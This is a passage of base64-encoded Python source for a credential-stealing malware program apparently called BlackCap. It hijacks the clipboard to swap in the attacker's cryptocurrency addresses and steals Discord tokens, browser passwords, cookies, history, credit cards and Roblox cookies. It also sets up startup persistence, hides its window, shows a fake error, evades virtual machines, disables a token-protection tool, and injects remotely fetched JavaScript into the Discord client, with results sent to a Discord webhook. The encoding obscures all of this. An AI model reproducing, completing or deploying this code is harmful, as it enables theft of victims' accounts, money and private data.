Hkoc2VsZi5hZGRyZXNzX2Rhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgiLzRbMC05QUJdWzEtOUEtSEotTlAtWmEta20tel17OTN9JC9nIiwgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX21vbmVybyAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFsKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2J0YywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2V0aCwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3hjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3BjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2NjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX21vbmVybywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2FkYSwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2Rhc2gsCiAgICAgICAgICAgICAgICAgICAgXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX21vbmVybykKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGRhdGEgPSBOb25lCgogICAgZGVmIGxvb3BfdGhyb3VnaChzZWxmKToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBzZWxmLmFkZHJlc3Nfc3dhcCgpCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBpZiBzZWxmLmFkZHJlc3Nfc3QzYWxlciA9PSAieWVzIjoKICAgICAgICAgICAgc2VsZi5sb29wX3Rocm91Z2goKQoKCmNsYXNzIGZpcnN0X2Z1bmN0aW9uX2JjKEZ1bmN0aW9ucyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kc2NhcDEgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgoKICAgICAgICBzZWxmLmRpc2NvcmRfd2ViaG9vayA9IHNlbGYuZmluZF9pbl9jb25maWcoInlvdXJ3ZWJob29rdXJsIikKCiAgICAgICAgc2VsZi5oaWRlID0gc2VsZi5maW5kX2luX2NvbmZpZygiaGlkZSIpCgogICAgICAgIHNlbGYucGluZ3R5cGUgPSBzZWxmLmZpbmRfaW5fY29uZmlnKCJwaW5ndHlwZSIpCgogICAgICAgIHNlbGYucGluZ29ucnVuID0gc2VsZi5maW5kX2luX2NvbmZpZygicGluZyIpCgogICAgICAgIHNlbGYuYmFzZXVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCgogICAgICAgIHNlbGYuc3RhcnR1cGV4ZSA9IHNlbGYuZmluZF9pbl9jb25maWcoInN0YXJ0dXAiKQoKICAgICAgICBzZWxmLmZha2VfZXJyb3IgPSBzZWxmLmZpbmRfaW5fY29uZmlnKCJmYWtlX2Vycm9yIikKCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQoKICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQoKICAgICAgICBzZWxmLmNocm1tdXNlcmR0dCA9IG50cGF0aC5qb2luKHNlbGYuYXBwZGF0YSwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIikKCiAgICAgICAgc2VsZi5kaXIsIHNlbGYudGVtcCA9IG1rZHRlbXAoKSwgZ2V0dGVtcGRpcigpCgogICAgICAgIGluZiwgbmV0ID0gc2VsZi5pbmZvX3N5cygpLCBzZWxmLmluZm9fbmV0d29yZCgpCgogICAgICAgIHNlbGYud2luZG93c191dWlkLCBzZWxmLm5ldmVyX3dpbmQsIHNlbGYua2V5X3dpbmRvd3NfZmluZCA9ICgKICAgICAgICAgICAgaW5mWzBdLAogICAgICAgICAgICBpbmZbMV0sCiAgICAgICAgICAgIGluZlsyXSwKICAgICAgICApCgogICAgICAgICgKICAgICAgICAgICAgc2VsZi5pcCwKICAgICAgICAgICAgc2VsZi5jaXR5LAogICAgICAgICAgICBzZWxmLmNvdW50cnksCiAgICAgICAgICAgIHNlbGYucmVnaW9uLAogICAgICAgICAgICBzZWxmLm9yZywKICAgICAgICAgICAgc2VsZi5sb2MsCiAgICAgICAgICAgIHNlbGYuZ29vZ2xlbWFwLAogICAgICAgICkgPSAobmV0WzBdLCBuZXRbMV0sIG5ldFsyXSwgbmV0WzNdLCBuZXRbNF0sIG5ldFs1XSwgbmV0WzZdKQoKICAgICAgICBzZWxmLnNydHVwbDBjID0gbnRwYXRoLmpvaW4oCiAgICAgICAgICAgIHNlbGYucm9hbWluZywgIk1pY3Jvc29mdCIsICJXaW5kb3dzIiwgIlN0YXJ0IE1lbnUiLCAiUHJvZ3JhbXMiLCAiU3RhcnR1cCIKICAgICAgICApCgogICAgICAgIHNlbGYucmVnZXhfd2ViaG9va19kc2MgPSAiYXBpL3dlYmhvb2tzIgoKICAgICAgICBzZWxmLmNocm1yZ3ggPSByZS5jb21waWxlKAogICAgICAgICAgICByIihecHJvZmlsZVxzXGQqKXxkZWZhdWx0fChndWVzdCBwcm9maWxlJCkiLCByZS5JR05PUkVDQVNFIHwgcmUuTVVMVElMSU5FCiAgICAgICAgKQoKICAgICAgICBzZWxmLmJhc2V1cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgoKICAgICAgICBzZWxmLnJlZ2V4ID0gcmVneF9uZXQKCiAgICAgICAgc2VsZi5lbmNyeXB0ZWRfcmVnZXggPSByImRRdzR3OVdnWGNROlteXCJdKiIKCiAgICAgICAgc2VsZi50b2tlbnMgPSBbXQoKICAgICAgICBzZWxmLmJjX2lkID0gW10KCiAgICAgICAgc2VsZi5zZXAgPSBvcy5zZXAKCiAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzID0gW10KCiAgICAgICAgc2VsZi5jaHJvbWVfa2V5ID0gc2VsZi5teWtleV9ndG0obnRwYXRoLmpvaW4oc2VsZi5jaHJtbXVzZXJkdHQsICJMb2NhbCBTdGF0ZSIpKQoKICAgICAgICBvcy5tYWtlZGlycyhzZWxmLmRpciwgZXhpc3Rfb2s9VHJ1ZSkKCiAgICBkZWYgcmVtb3Rlcl9iY19lcnIoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgc2VsZi5mYWtlX2Vycm9yID09ICJ5ZXMiOgogICAgICAgICAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5NZXNzYWdlQm94VygKICAgICAgICAgICAgICAgIE5vbmUsCiAgICAgICAgICAgICAgICAiRXJyb3IgY29kZTogV2luZG93c18weDk4ODk1OFxuU29tZXRoaW5nIGdvbmUgd3JvbmcuIiwKICAgICAgICAgICAgICAgICJGYXRhbCBFcnJvciIsCiAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICApCgogICAgZGVmIHBpbmdfb25fcnVubmluZyhzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBwaW5nMSA9IHsKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtQXNzZXRzL21haW4vYmxhY2tjYXAlMjAoMikucG5nIiwKICAgICAgICAgICAgImNvbnRlbnQiOiAiQGV2ZXJ5b25lIiwKICAgICAgICB9CiAgICAgICAgcGluZzIgPSB7CiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LU0NIZHNjL0JsYWNrQ2FwLUFzc2V0cy9tYWluL2JsYWNrY2FwJTIwKDIpLnBuZyIsCiAgICAgICAgICAgICJjb250ZW50IjogIkBoZXJlIiwKICAgICAgICB9CiAgICAgICAgaWYgc2VsZi5waW5nb25ydW4gPT0gInllcyI6CiAgICAgICAgICAgIGlmIHNlbGYucmVnZXhfd2ViaG9va19kc2MgaW4gc2VsZi5kaXNjb3JkX3dlYmhvb2s6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAZXZlcnlvbmUiIG9yIHNlbGYucGluZ3R5cGUgPT0gImV2ZXJ5b25lIjoKICAgICAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPXBpbmcxKQogICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAaGVyZSIgb3Igc2VsZi5waW5ndHlwZSA9PSAiaGVyZSI6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgICAgIGh0dHB4LnBvc3Qoc2VsZi5kaXNjb3JkX3dlYmhvb2ssIGpzb249cGluZzIpCgogICAgZGVmIHN0YXJ0dXBfYmMoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgc2VsZi5zdGFydHVwZXhlID09ICJ5ZXMiOgogICAgICAgICAgICBzdGFydHVwX3BhdGggPSAoCiAgICAgICAgICAgICAgICBvcy5nZXRlbnYoImFwcGRhdGEiKQogICAgICAgICAgICAgICAgKyAiXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFwiCiAgICAgICAgICAgICkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc3RhcnR1cF9wYXRoICsgYXJndlswXSk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc3RhcnR1cF9wYXRoICsgYXJndlswXSkKICAgICAgICAgICAgICAgIGNvcHkyKGFyZ3ZbMF0sIHN0YXJ0dXBfcGF0aCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvcHkyKGFyZ3ZbMF0sIHN0YXJ0dXBfcGF0aCkKCiAgICBkZWYgaGlkZV9iYyhzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLmhpZGUgPT0gInllcyI6CiAgICAgICAgICAgIGhpZGUgPSB3aW4zMmd1aS5HZXRGb3JlZ3JvdW5kV2luZG93KCkKICAgICAgICAgICAgd2luMzJndWkuU2hvd1dpbmRvdyhoaWRlLCB3aW4zMmNvbi5TV19ISURFKQoKICAgIGRlZiBiY19leGl0X3RoaXMoc2VsZik6CiAgICAgICAgc2h1dGlsLnJtdHJlZShzZWxmLmRpciwgaWdub3JlX2Vycm9ycz1UcnVlKQogICAgICAgIG9zLl9leGl0KDApCgogICAgZGVmIGV4dHJhY3RfdHJ5KGZ1bmMpOgogICAgICAgICIiIkRlY29yYXRvciB0byBzYWZlbHkgY2F0Y2ggYW5kIGlnbm9yZSBleGNlcHRpb25zIiIiCgogICAgICAgIGRlZiB3cmFwcGVyKCphcmdzLCAqKmt3YXJncyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICByZXR1cm4gd3JhcHBlcgoKICAgIGFzeW5jIGRlZiBpbml0KHNlbGYpOgogICAgICAgIHNlbGYuYnJvd3NlcnMgPSB7CiAgICAgICAgICAgICJhbWlnbyI6IHNlbGYuYXBwZGF0YSArICJcXEFtaWdvXFxVc2VyIERhdGEiLAogICAgICAgICAgICAidG9yY2giOiBzZWxmLmFwcGRhdGEgKyAiXFxUb3JjaFxcVXNlciBEYXRhIiwKICAgICAgICAgICAgImtvbWV0YSI6IHNlbGYuYXBwZGF0YSArICJcXEtvbWV0YVxcVXNlciBEYXRhIiwKICAgICAgICAgICAgIm9yYml0dW0iOiBzZWxmLmFwcGRhdGEgKyAiXFxPcmJpdHVtXFxVc2VyIERhdGEiLAogICAgICAgICAgICAiY2VudC1icm93c2VyIjogc2VsZi5hcHBkYXRhICsgIlxcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICI3c3RhciI6IHNlbGYuYXBwZGF0YSArICJcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhIiwKICAgICAgICAgICAgInNwdXRuaWsiOiBzZWxmLmFwcGRhdGEgKyAiXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEiLAogICAgICAgICAgICAidml2YWxkaSI6IHNlbGYuYXBwZGF0YSArICJcXFZpdmFsZGlcXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICJnb29nbGUtY2hyb21lLXN4cyI6IHNlbGYuYXBwZGF0YSArICJcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhIiwKICAgICAgICAgICAgImdvb2dsZS1jaHJvbWUiOiBzZWxmLmFwcGRhdGEgKyAiXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhIiwKICAgICAgICAgICAgImVwaWMtcHJpdmFjeS1icm93c2VyIjogc2VsZi5hcHBkYXRhICsgIlxcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICJtaWNyb3NvZnQtZWRnZSI6IHNlbGYuYXBwZGF0YSArICJcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhIiwKICAgICAgICAgICAgInVyYW4iOiBzZWxmLmFwcGRhdGEgKyAiXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICJ5YW5kZXgiOiBzZWxmLmFwcGRhdGEgKyAiXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICJicmF2ZSI6IHNlbGYuYXBwZGF0YSArICJcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YSIsCiAgICAgICAgICAgICJpcmlkaXVtIjogc2VsZi5hcHBkYXRhICsgIlxcSXJpZGl1bVxcVXNlciBEYXRhIiwKICAgICAgICAgICAgImVkZ2UiOiBzZWxmLmFwcGRhdGEgKyAiXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YSIsCiAgICAgICAgfQogICAgICAgIHNlbGYucHJvZmlsZXMgPSBbCiAgICAgICAgICAgICJEZWZhdWx0IiwKICAgICAgICAgICAgIlByb2ZpbGUgMSIsCiAgICAgICAgICAgICJQcm9maWxlIDIiLAogICAgICAgICAgICAiUHJvZmlsZSAzIiwKICAgICAgICAgICAgIlByb2ZpbGUgNCIsCiAgICAgICAgICAgICJQcm9maWxlIDUiLAogICAgICAgIF0KCiAgICAgICAgaWYgc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIiIgb3Igc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIlx4NTdFQkhPT0tfSEVSRSI6CiAgICAgICAgICAgIHNlbGYuYmNfZXhpdF90aGlzKCkKICAgICAgICBzZWxmLmhpZGVfYmMoKQogICAgICAgIHNlbGYucmVtb3Rlcl9iY19lcnIoKQogICAgICAgIHNlbGYuc3RhcnR1cF9iYygpCgogICAgICAgIGlmIHNlbGYuZmluZF9pbl9jb25maWcoImRidWdraWxsZXIiKSBhbmQgTm9EZWJ1Z2coKS5pblZNIGlzIFRydWU6CiAgICAgICAgICAgIHNlbGYuYmNfZXhpdF90aGlzKCkKICAgICAgICBhd2FpdCBzZWxmLmJ5cGFzc19idHRkc2MoKQogICAgICAgIGF3YWl0IHNlbGYuYnlwYXNzX3Rva2VucHJ0Y3QoKQoKICAgICAgICBmdW5jdGlvbl9saXN0ID0gWwogICAgICAgICAgICBzZWxmLnNjcmVlbnRpbWVzLAogICAgICAgICAgICBzZWxmLnN5c3RlbV9pbmZvcm1hdGlvbnMsCiAgICAgICAgICAgIHNlbGYuZmluZF9iY3Rva2VuLAogICAgICAgICAgICBzZWxmLm1jX2ZpbmQsCiAgICAgICAgICAgIHNlbGYuZmluZF9yb2Jsb3gsCiAgICAgICAgXQoKICAgICAgICBpZiBzZWxmLmZpbmRfaW5fY29uZmlnKCJraWxsX2Rpc2NvcmRfcHJvY2VzcyIpOgogICAgICAgICAgICBhd2FpdCBzZWxmLmtpbGxfcHJvY2Vzc19pZCgpCiAgICAgICAgb3MubWFrZWRpcnMobnRwYXRoLmpvaW4oc2VsZi5kaXIsICJCcm93c2VycyIpLCBleGlzdF9vaz1UcnVlKQogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHNlbGYuYnJvd3NlcnMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIocGF0aCk6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBzZWxmLm1hc3RlcmtleSA9IHNlbGYubXlrZXlfZ3RtKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIpCiAgICAgICAgICAgIHNlbGYuZnVuY3MgPSBbCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX2Nvb2tpZXMyLAogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9oaXN0b3J5MiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfcGFzc3dvcmRzMiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfY2MyLAogICAgICAgICAgICBdCgogICAgICAgICAgICBmb3IgcHJvZmlsZSBpbiBzZWxmLnByb2ZpbGVzOgogICAgICAgICAgICAgICAgZm9yIGZ1bmMgaW4gc2VsZi5mdW5jczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmMobmFtZSwgcGF0aCwgcHJvZmlsZSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICBpZiBudHBhdGguZXhpc3RzKHNlbGYuY2hybW11c2VyZHR0KSBhbmQgc2VsZi5jaHJvbWVfa2V5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBvcy5tYWtlZGlycyhudHBhdGguam9pbihzZWxmLmRpciwgIkdvb2dsZSIpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmV4dGVuZCgKICAgICAgICAgICAgICAgIFtzZWxmLnN0ZWFsX3Bhc3N3b3Jkcywgc2VsZi5zdGVhbF9jb29raWVzLCBzZWxmLnN0ZWFsX2hpc3RvcnldCiAgICAgICAgICAgICkKICAgICAgICBmb3IgZnVuYyBpbiBmdW5jdGlvbl9saXN0OgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHByb2Nlc3Muc3RhcnQoKQogICAgICAgIGZvciB0IGluIHRocmVhZGluZy5lbnVtZXJhdGUoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgc2VsZi5uYXRpZnlfbWF0Y2hlZF90b2tlbnMoKQogICAgICAgIGF3YWl0IHNlbGYuZGlzY29faW5qZWN0aW9uKCkKICAgICAgICBzZWxmLnBpbmdfb25fcnVubmluZygpCiAgICAgICAgc2VsZi5maW5pc2hlZF9iYygpCgogICAgYXN5bmMgZGVmIGRpc2NvX2luamVjdGlvbihzZWxmKToKICAgICAgICAjIFRPIERPOiByZWR1Y2UgY29nbmV0aXZlIGNvbXBsZXhpdHkKICAgICAgICBmb3IgX2RpciBpbiBvcy5saXN0ZGlyKHNlbGYuYXBwZGF0YSk6CiAgICAgICAgICAgIGlmICJkaXNjb3JkIiBpbiBfZGlyLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBkaXNjb3JkID0gc2VsZi5hcHBkYXRhICsgb3Muc2VwICsgX2RpcgogICAgICAgICAgICAgICAgZm9yIF9fZGlyIGluIG9zLmxpc3RkaXIobnRwYXRoLmFic3BhdGgoZGlzY29yZCkpOgogICAgICAgICAgICAgICAgICAgIGlmIHJlLm1hdGNoKHIiYXBwLShcZCpcLlxkKikqIiwgX19kaXIpOgogICAgICAgICAgICAgICAgICAgICAgICBhcHAgPSBudHBhdGguYWJzcGF0aChudHBhdGguam9pbihkaXNjb3JkLCBfX2RpcikpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vZHVsZXMgPSBudHBhdGguam9pbihhcHAsICJtb2R1bGVzIikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKG1vZHVsZXMpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfX19kaXIgaW4gb3MubGlzdGRpcihtb2R1bGVzKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJlLm1hdGNoKHIiZGlzY29yZF9kZXNrdG9wX2NvcmUtXGQrIiwgX19fZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmpfcGF0aCA9ICgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbW9kdWxlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIG9zLnNlcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIF9fX2RpcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIGYiXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhpbmpfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuc3J0dXBsMGMgbm90IGluIGFyZ3ZbMF06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlual9wYXRoICsgImJsYWNrY2FwIiwgZXhpc3Rfb2s9VHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiA9IGh0dHB4LmdldCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZpbmRfaW5fY29uZmlnKCJiY19pbmplY3Rpb25fdXJsIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkudGV4dC5yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlV0VCSE9PSyUiLCBzZWxmLmRpc2NvcmRfd2ViaG9vawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSAgIyAucmVwbGFjZSgiJW51bV9jb3JlX2Rpc2NvcmQlIiwgaW5qX3BhdGggKyAnaW5kZXguanMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5qX3BhdGggKyAiaW5kZXguanMiLCAidyIsIGVycm9ycz0iaWdub3JlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSBhcyBpbmRleEZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXhGaWxlLndyaXRlKGYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuZmluZF9pbl9jb25maWcoImtpbGxfZGlzY29yZF9wcm9jZXNzIik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUoYXBwICsgc2VsZi5zZXAgKyBfZGlyICsgIi5leGUiKQoKICAgIGFzeW5jIGRlZiBieXBhc3NfdG9rZW5wcnRjdChzZWxmKToKICAgICAgICB0cCA9IGYie3NlbGYucm9hbWluZ31cXERpc2NvcmRUb2tlblByb3RlY3RvclxcIgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHRwKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY29uZmlnID0gdHAgKyAiY29uZmlnLmpzb24iCgogICAgICAgIGZvciBpIGluIFsiRGlzY29yZFRva2VuUHJvdGVjdG9yLmV4ZSIsICJQcm90ZWN0aW9uUGF5bG9hZC5kbGwiLCAic2VjdXJlLmRhdCJdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUodHAgKyBpKQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhjb25maWcpOgogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGY6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaXRlbSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgZXhjZXB0IGpzb24uZGVjb2Rlci5KU09ORGVjb2RlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBpdGVtWyJrc2NoX2lzX2hlcmUiXSA9ICJodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIKICAgICAgICAgICAgICAgIGl0ZW1bImF1dG9fc3RhcnQiXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJhdXRvX3N0YXJ0X2Rpc2NvcmQiXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJpbnRlZ3JpdHkiXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJpbnRlZ3JpdHlfYWxsb3diZXR0ZXJkaXNjb3JkIl0gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsiaW50ZWdyaXR5X2NoZWNrZXhlY3V0YWJsZSJdID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bImludGVncml0eV9jaGVja2hhc2giXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJpbnRlZ3JpdHlfY2hlY2ttb2R1bGUiXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJpbnRlZ3JpdHlfY2hlY2tzY3JpcHRzIl0gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsiaW50ZWdyaXR5X2NoZWNrcmVzb3VyY2UiXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWyJpbnRlZ3JpdHlfcmVkb3dubG9hZGhhc2hlcyJdID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bIml0ZXJhdGlvbnNfaXYiXSA9IDM2NAogICAgICAgICAgICAgICAgaXRlbVsiaXRlcmF0aW9uc19rZXkiXSA9IDQ1NwogICAgICAgICAgICAgICAgaXRlbVsidmVyc2lvbiJdID0gNjk0MjAKICAgICAgICAgICAgd2l0aCBvcGVuKGNvbmZpZywgInciKSBhcyBmOgogICAgICAgICAgICAgICAganNvbi5kdW1wKGl0ZW0sIGYsIGluZGVudD0yLCBzb3J0X2tleXM9VHJ1ZSkKICAgICAgICAgICAgd2l0aCBvcGVuKGNvbmZpZywgImEiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZSgiXG5cbi8vS1NDSF9pc19oZXJlIHwgaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2MiKQoKICAgIGFzeW5jIGRlZiBraWxsX3Byb2Nlc3NfaWQoc2VsZik6CiAgICAgICAgYmxsaXN0ID0gc2VsZi5maW5kX2luX2NvbmZpZygiYmxwcmdnZyIpCiAgICAgICAgZm9yIGkgaW4gWwogICAgICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgICAgICJkaXNjb3JkdG9rZW5wcm90ZWN0b3IiLAogICAgICAgICAgICAiZGlzY29yZGNhbmFyeSIsCiAgICAgICAgICAgI